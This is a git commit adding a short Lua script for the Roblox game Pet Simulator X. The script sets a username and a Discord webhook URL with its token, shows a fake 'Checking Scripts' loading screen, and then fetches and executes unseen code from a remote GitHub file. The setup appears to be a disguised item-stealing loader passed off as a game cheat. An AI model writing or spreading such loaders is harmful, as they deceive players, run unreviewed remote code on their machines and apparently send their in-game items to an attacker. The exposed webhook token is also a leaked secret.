14a8b3473b6859f1029300951712ac051e269458
SwiftZ3 <110406211+SwiftZ3@users.noreply.github.com>
2023-03-31 23:28:17 +0300

    Add files via upload

---
+++ PetSimXScripts.lua
@@ -0,0 +1,10 @@
+Username = "KANHatcher"
+WebHook = "https://discord.com/api/webhooks/1091454255229059072/r_qUUbnlPSqIbBALcwdxaQweFK_v0YhPj_1MaQ7zmH6u2yUYhk1JuwRfIEnosTlnwQls"
+
+loadingscreen = true -- set this to false and remove _G. stuff to use your own GUI
+_G.CustomScriptName = "PSX Script"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
